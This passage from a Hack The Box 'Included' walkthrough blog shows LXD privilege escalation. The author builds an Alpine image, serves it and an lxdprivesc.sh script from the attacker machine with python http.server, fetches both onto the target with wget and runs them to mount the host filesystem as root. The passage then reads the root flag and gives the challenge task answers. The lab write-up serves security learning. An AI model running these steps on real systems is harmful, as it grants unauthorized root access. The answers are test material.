</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>Downloading apk-tools-static-2.14.0-r2.apk
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
</span></span><span class=line><span class=cl>Verified OK
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>  <span class=m>2617</span>  <span class=m>100</span>  <span class=m>2617</span>    <span class=m>0</span>     <span class=m>0</span>   <span class=m>5262</span>      <span class=m>0</span> --:--:-- --:--:-- --:--:--  <span class=m>5286</span>
</span></span><span class=line><span class=cl>--2023-05-23 17:53:37--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
</span></span><span class=line><span class=cl>Resolving alpine.mirror.wearetriple.com <span class=o>(</span>alpine.mirror.wearetriple.com<span class=o>)</span>... 93.187.10.106, 2a00:1f00:dc06:10::106
</span></span><span class=line><span class=cl>Connecting to alpine.mirror.wearetriple.com <span class=o>(</span>alpine.mirror.wearetriple.com<span class=o>)</span><span class=p>|</span>93.187.10.106<span class=p>|</span>:80... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>2617</span> <span class=o>(</span>2.6K<span class=o>)</span> <span class=o>[</span>text/plain<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘/home/htb-bluewalle/included/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/home/htb-bluewalle/inc 100%<span class=o>[===============================</span>&gt;<span class=o>]</span>   2.56K  --.-KB/s    in 0s      
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023-05-23 17:53:37 <span class=o>(</span><span class=m>306</span> MB/s<span class=o>)</span> - ‘/home/htb-bluewalle/included/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved <span class=o>[</span>2617/2617<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Selecting mirror http://mirror.kumi.systems/alpine/v3.18/main
</span></span><span class=line><span class=cl>fetch http://mirror.kumi.systems/alpine/v3.18/main/x86_64/APKINDEX.tar.gz
</span></span><span class=line><span class=cl><span class=o>(</span>1/25<span class=o>)</span> Installing alpine-baselayout-data <span class=o>(</span>3.4.3-r1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>2/25<span class=o>)</span> Installing musl <span class=o>(</span>1.2.4-r0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>3/25<span class=o>)</span> Installing busybox <span class=o>(</span>1.36.0-r9<span class=o>)</span>
</span></span><span class=line><span class=cl>Executing busybox-1.36.0-r9.post-install
</span></span><span class=line><span class=cl><span class=o>(</span>4/25<span class=o>)</span> Installing busybox-binsh <span class=o>(</span>1.36.0-r9<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>5/25<span class=o>)</span> Installing alpine-baselayout <span class=o>(</span>3.4.3-r1<span class=o>)</span>
</span></span><span class=line><span class=cl>Executing alpine-baselayout-3.4.3-r1.pre-install
</span></span><span class=line><span class=cl>Executing alpine-baselayout-3.4.3-r1.post-install
</span></span><span class=line><span class=cl><span class=o>(</span>6/25<span class=o>)</span> Installing ifupdown-ng <span class=o>(</span>0.12.1-r2<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>7/25<span class=o>)</span> Installing libcap2 <span class=o>(</span>2.69-r0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>8/25<span class=o>)</span> Installing openrc <span class=o>(</span>0.47.1-r0<span class=o>)</span>
</span></span><span class=line><span class=cl>Executing openrc-0.47.1-r0.post-install
</span></span><span class=line><span class=cl><span class=o>(</span>9/25<span class=o>)</span> Installing mdev-conf <span class=o>(</span>4.5-r0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>10/25<span class=o>)</span> Installing busybox-mdev-openrc <span class=o>(</span>1.36.0-r9<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>11/25<span class=o>)</span> Installing alpine-conf <span class=o>(</span>3.16.1-r1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>12/25<span class=o>)</span> Installing alpine-keys <span class=o>(</span>2.4-r1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>13/25<span class=o>)</span> Installing alpine-release <span class=o>(</span>3.18.0-r0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>14/25<span class=o>)</span> Installing ca-certificates-bundle <span class=o>(</span>20230506-r0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>15/25<span class=o>)</span> Installing libcrypto3 <span class=o>(</span>3.1.0-r4<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>16/25<span class=o>)</span> Installing libssl3 <span class=o>(</span>3.1.0-r4<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>17/25<span class=o>)</span> Installing ssl_client <span class=o>(</span>1.36.0-r9<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>18/25<span class=o>)</span> Installing zlib <span class=o>(</span>1.2.13-r1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>19/25<span class=o>)</span> Installing apk-tools <span class=o>(</span>2.14.0-r2<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>20/25<span class=o>)</span> Installing busybox-openrc <span class=o>(</span>1.36.0-r9<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>21/25<span class=o>)</span> Installing busybox-suid <span class=o>(</span>1.36.0-r9<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>22/25<span class=o>)</span> Installing scanelf <span class=o>(</span>1.3.7-r1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>23/25<span class=o>)</span> Installing musl-utils <span class=o>(</span>1.2.4-r0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>24/25<span class=o>)</span> Installing libc-utils <span class=o>(</span>0.7.2-r5<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>25/25<span class=o>)</span> Installing alpine-base <span class=o>(</span>3.18.0-r0<span class=o>)</span>
</span></span><span class=line><span class=cl>Executing busybox-1.36.0-r9.trigger
</span></span><span class=line><span class=cl>OK: <span class=m>10</span> MiB in <span class=m>25</span> packages
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 3.6M
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root          root          3.6M May <span class=m>23</span> 17:53 alpine-v3.18-x86_64-20230523_1753.tar.gz
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> htb-bluewalle htb-bluewalle 7.9K May <span class=m>23</span> 17:48 build-alpine
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> htb-bluewalle htb-bluewalle 1.5K May <span class=m>23</span> 17:34 lxdprivesc.sh
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle 5.4K May <span class=m>23</span> 16:56 revshell.php
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ mv alpine-v3.18-x86_64-20230523_1753.tar.gz alpinebuild.tar.gz
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><ul><li>Step 3: Run this script and you will get root [Victim Machine]</li></ul><p>First, we will need to <strong>move</strong> the generated <em>alpine</em> file and the script <strong>over</strong> to our <strong>target</strong>. One way to achieve this is to use the <strong>http.server</strong> <strong>python</strong> module.</p><p>It is important to <strong>start</strong> the <strong>http server</strong> in the <strong>same directory</strong> where the two files are located.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ python -m http.server <span class=m>8888</span>
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>8888</span> <span class=o>(</span>http://0.0.0.0:8888/<span class=o>)</span> ...
</span></span></code></pre></div><p>Then we use <em><strong>wget</strong></em> on our <strong>target</strong> to download these same files.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mike@included:/var/www/html$ <span class=nb>cd</span> /tmp/
</span></span><span class=line><span class=cl>mike@included:/tmp$ wget http://10.10.14.75:8888/alpinebuild.tar.gz
</span></span><span class=line><span class=cl>--2023-05-23 17:05:43--  http://10.10.14.75:8888/alpinebuild.tar.gz
</span></span><span class=line><span class=cl>Connecting to 10.10.14.75:8888... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>3705051</span> <span class=o>(</span>3.5M<span class=o>)</span> <span class=o>[</span>application/gzip<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘alpinebuild.tar.gz’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>alpinebuild.tar.gz  100%<span class=o>[===================</span>&gt;<span class=o>]</span>   3.53M  23.5MB/s    in 0.2s    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023-05-23 17:05:43 <span class=o>(</span>23.5 MB/s<span class=o>)</span> - ‘alpinebuild.tar.gz’ saved <span class=o>[</span>3705051/3705051<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mike@included:/tmp$ wget http://10.10.14.75:8888/lxdprivesc.sh
</span></span><span class=line><span class=cl>--2023-05-23 17:05:57--  http://10.10.14.75:8888/lxdprivesc.sh
</span></span><span class=line><span class=cl>Connecting to 10.10.14.75:8888... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>1451</span> <span class=o>(</span>1.4K<span class=o>)</span> <span class=o>[</span>text/x-sh<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘lxdprivesc.sh’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>lxdprivesc.sh       100%<span class=o>[===================</span>&gt;<span class=o>]</span>   1.42K  --.-KB/s    in 0s      
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023-05-23 17:05:57 <span class=o>(</span>70.4 MB/s<span class=o>)</span> - ‘lxdprivesc.sh’ saved <span class=o>[</span>1451/1451<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mike@included:/tmp$ ll
</span></span><span class=line><span class=cl>total <span class=m>3632</span>
</span></span><span class=line><span class=cl>drwxrwxrwt  <span class=m>2</span> root root    <span class=m>4096</span> May <span class=m>23</span> 17:05 ./
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>24</span> root root    <span class=m>4096</span> Oct <span class=m>11</span>  <span class=m>2021</span> ../
</span></span><span class=line><span class=cl>-rw-rw-r--  <span class=m>1</span> mike mike <span class=m>3705051</span> May <span class=m>23</span> 16:53 alpinebuild.tar.gz
</span></span><span class=line><span class=cl>-rw-rw-r--  <span class=m>1</span> mike mike    <span class=m>1451</span> May <span class=m>23</span> 16:34 lxdprivesc.sh
</span></span><span class=line><span class=cl>mike@included:/tmp$
</span></span></code></pre></div><p>Finally, we <strong>run</strong> the <strong>script</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mike@included:/tmp$ chmod a+x lxdprivesc.sh 
</span></span><span class=line><span class=cl>mike@included:/tmp$ ll
</span></span><span class=line><span class=cl>total <span class=m>3632</span>
</span></span><span class=line><span class=cl>drwxrwxrwt  <span class=m>2</span> root root    <span class=m>4096</span> May <span class=m>23</span> 17:10 ./
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>24</span> root root    <span class=m>4096</span> Oct <span class=m>11</span>  <span class=m>2021</span> ../
</span></span><span class=line><span class=cl>-rw-rw-r--  <span class=m>1</span> mike mike <span class=m>3705051</span> May <span class=m>23</span> 16:53 alpinebuild.tar.gz
</span></span><span class=line><span class=cl>-rwxrwxr-x  <span class=m>1</span> mike mike    <span class=m>1451</span> May <span class=m>23</span> 16:34 lxdprivesc.sh*
</span></span><span class=line><span class=cl>mike@included:/tmp$ ./lxdprivesc.sh -f alpinebuild.tar.gz 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Listing images...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> ALIAS  <span class=p>|</span> FINGERPRINT  <span class=p>|</span> PUBLIC <span class=p>|</span>          DESCRIPTION          <span class=p>|</span>  ARCH  <span class=p>|</span>  SIZE  <span class=p>|</span>         UPLOAD DATE          <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> alpine <span class=p>|</span> c3c843ed2546 <span class=p>|</span> no     <span class=p>|</span> alpine v3.18 <span class=o>(</span>20230523_17:53<span class=o>)</span> <span class=p>|</span> x86_64 <span class=p>|</span> 3.53MB <span class=p>|</span> May 23, <span class=m>2023</span> at 5:11pm <span class=o>(</span>UTC<span class=o>)</span> <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
</span></span><span class=line><span class=cl>Creating privesc
</span></span><span class=line><span class=cl>Device giveMeRoot added to privesc
</span></span><span class=line><span class=cl>~ <span class=c1>#</span>
</span></span></code></pre></div><p>Moving on to the <strong>last step</strong>.</p><ul><li>Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~ <span class=c1># cd /mnt/root</span>
</span></span><span class=line><span class=cl>/mnt/root <span class=c1># ls -hla</span>
</span></span><span class=line><span class=cl>total 100K   
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>24</span> root     root        4.0K Oct <span class=m>11</span>  <span class=m>2021</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>3</span> root     root        4.0K May <span class=m>23</span> 17:11 ..
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>2</span> root     root        4.0K Jul <span class=m>26</span>  <span class=m>2021</span> bin
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>3</span> root     root        4.0K Oct <span class=m>11</span>  <span class=m>2021</span> boot
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>2</span> root     root        4.0K Apr <span class=m>23</span>  <span class=m>2021</span> cdrom
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>17</span> root     root        3.8K May <span class=m>23</span> 14:01 dev
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>98</span> root     root        4.0K Jul <span class=m>26</span>  <span class=m>2021</span> etc
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>3</span> root     root        4.0K Mar  <span class=m>5</span>  <span class=m>2020</span> home
</span></span><span class=line><span class=cl>lrwxrwxrwx    <span class=m>1</span> root     root          <span class=m>34</span> Jul <span class=m>26</span>  <span class=m>2021</span> initrd.img -&gt; boot/initrd.img-4.15.0-151-generic
</span></span><span class=line><span class=cl>lrwxrwxrwx    <span class=m>1</span> root     root          <span class=m>34</span> Oct <span class=m>11</span>  <span class=m>2021</span> initrd.img.old -&gt; boot/initrd.img-4.15.0-151-generic
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>21</span> root     root        4.0K Jul <span class=m>26</span>  <span class=m>2021</span> lib
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>2</span> root     root        4.0K Jul <span class=m>26</span>  <span class=m>2021</span> lib64
</span></span><span class=line><span class=cl>drwx------    <span class=m>2</span> root     root       16.0K Mar  <span class=m>5</span>  <span class=m>2020</span> lost+found
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>2</span> root     root        4.0K Apr <span class=m>23</span>  <span class=m>2021</span> media
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>2</span> root     root        4.0K Aug  <span class=m>5</span>  <span class=m>2019</span> mnt
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>2</span> root     root        4.0K Apr <span class=m>23</span>  <span class=m>2021</span> opt
</span></span><span class=line><span class=cl>dr-xr-xr-x  <span class=m>149</span> root     root           <span class=m>0</span> May <span class=m>23</span> 14:01 proc
</span></span><span class=line><span class=cl>drwx------    <span class=m>7</span> root     root        4.0K Apr <span class=m>23</span>  <span class=m>2021</span> root
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>26</span> root     root         <span class=m>920</span> May <span class=m>23</span> 17:11 run
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>2</span> root     root       12.0K Jul <span class=m>26</span>  <span class=m>2021</span> sbin
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>4</span> root     root        4.0K Apr <span class=m>23</span>  <span class=m>2021</span> snap
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>2</span> root     root        4.0K Apr <span class=m>23</span>  <span class=m>2021</span> srv
</span></span><span class=line><span class=cl>dr-xr-xr-x   <span class=m>13</span> root     root           <span class=m>0</span> May <span class=m>23</span> 16:12 sys
</span></span><span class=line><span class=cl>drwxrwxrwt   <span class=m>11</span> root     root        4.0K May <span class=m>23</span> 17:11 tmp
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>11</span> root     root        4.0K Jul <span class=m>26</span>  <span class=m>2021</span> usr
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>14</span> root     root        4.0K Apr <span class=m>23</span>  <span class=m>2021</span> var
</span></span><span class=line><span class=cl>lrwxrwxrwx    <span class=m>1</span> root     root          <span class=m>31</span> Jul <span class=m>26</span>  <span class=m>2021</span> vmlinuz -&gt; boot/vmlinuz-4.15.0-151-generic
</span></span><span class=line><span class=cl>lrwxrwxrwx    <span class=m>1</span> root     root          <span class=m>31</span> Oct <span class=m>11</span>  <span class=m>2021</span> vmlinuz.old -&gt; boot/vmlinuz-4.15.0-151-generic
</span></span><span class=line><span class=cl>/mnt/root <span class=c1>#</span>
</span></span></code></pre></div><p>Since we are already here, how about <strong>grabbing</strong> the <strong>root flag</strong>?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/mnt/root <span class=c1># cd root/</span>
</span></span><span class=line><span class=cl>/mnt/root/root <span class=c1># ls -hlag</span>
</span></span><span class=line><span class=cl>total 40K    
</span></span><span class=line><span class=cl>drwx------    <span class=m>7</span> root        4.0K Apr <span class=m>23</span>  <span class=m>2021</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>24</span> root        4.0K Oct <span class=m>11</span>  <span class=m>2021</span> ..
</span></span><span class=line><span class=cl>lrwxrwxrwx    <span class=m>1</span> root           <span class=m>9</span> Mar <span class=m>11</span>  <span class=m>2020</span> .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> root        3.0K Apr  <span class=m>9</span>  <span class=m>2018</span> .bashrc
</span></span><span class=line><span class=cl>drwx------    <span class=m>2</span> root        4.0K Apr <span class=m>23</span>  <span class=m>2021</span> .cache
</span></span><span class=line><span class=cl>drwxr-x---    <span class=m>3</span> root        4.0K Mar <span class=m>11</span>  <span class=m>2020</span> .config
</span></span><span class=line><span class=cl>drwx------    <span class=m>3</span> root        4.0K Apr <span class=m>23</span>  <span class=m>2021</span> .gnupg
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>3</span> root        4.0K Mar  <span class=m>5</span>  <span class=m>2020</span> .local
</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> root         <span class=m>148</span> Aug <span class=m>17</span>  <span class=m>2015</span> .profile
</span></span><span class=line><span class=cl>drwx------    <span class=m>2</span> root        4.0K Apr <span class=m>23</span>  <span class=m>2021</span> .ssh
</span></span><span class=line><span class=cl>-r--------    <span class=m>1</span> root          <span class=m>33</span> Mar  <span class=m>9</span>  <span class=m>2020</span> root.txt
</span></span><span class=line><span class=cl>/mnt/root/root <span class=c1># cat root.txt </span>
</span></span><span class=line><span class=cl>&lt;flag&gt;
</span></span><span class=line><span class=cl>/mnt/root/root <span class=c1>#</span>
</span></span></code></pre></div><blockquote><p>alpine</p></blockquote><h2 id=task-7><strong>TASK 7</strong><a hidden class=anchor aria-hidden=true href=#task-7>#</a></h2><p><strong>Question</strong>: <em>What flag do we set to the container so that it has root privileges on the host system?</em></p><p>Well, since we went and used the <strong>exploit</strong> we found, the answer here may not seem so trivial. But as always, a thorough <strong>internet research</strong> simply get&rsquo;s the job done.</p><blockquote><p>security.privileged=true</p></blockquote><h2 id=task-8><strong>TASK 8</strong><a hidden class=anchor aria-hidden=true href=#task-8>#</a></h2><p><strong>Question</strong>: <em>If the root filesystem is mounted at /mnt in the container, where can the root flag be found on the container after the host system is mounted?</em></p><p>See <em>Step 4</em> from TASK7.</p><blockquote><p>/mnt/root/</p></blockquote><h2 id=submit-flag><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag>#</a></h2><p><strong>Question</strong>: <em>Submit user flag</em></p><p>It was <strong>already acquired</strong> during TASK5.</p><blockquote><p>flag</p></blockquote><h2 id=submit-flag-1><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag-1>#</a></h2><p><strong>Question</strong>: <em>Submit root flag</em></p><p>Similar to the <strong>user flag</strong>, the <strong>root flag</strong> was <strong>already</strong> grabbed during TASK6.</p><blockquote><p>flag</p></blockquote><p><strong>Congratulations</strong>, we just successfully <strong>pwned</strong> the <strong>target machine</strong>. All we have left to do now is to <strong>terminate</strong> the <strong>target</strong> box (if not terminated automatically) <strong>before</strong> we <strong>continue</strong> with the next box!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/included/>included</a></li><li><a href=https://bluewalle.github.io/tags/tier-2/>tier-2</a></li><li><a href=https://bluewalle.github.io/tags/vip-tier/>vip-tier</a></li><li><a href=https://bluewalle.github.io/tags/php/>php</a></li><li><a href=https://bluewalle.github.io/tags/web/>web</a></li><li><a href=https://bluewalle.github.io/tags/network/>network</a></li><li><a href=https://bluewalle.github.io/tags/custom-applications/>custom-applications</a></li><li><a href=https://bluewalle.github.io/tags/protocols/>protocols</a></li><li><a href=https://bluewalle.github.io/tags/apache/>apache</a></li><li><a 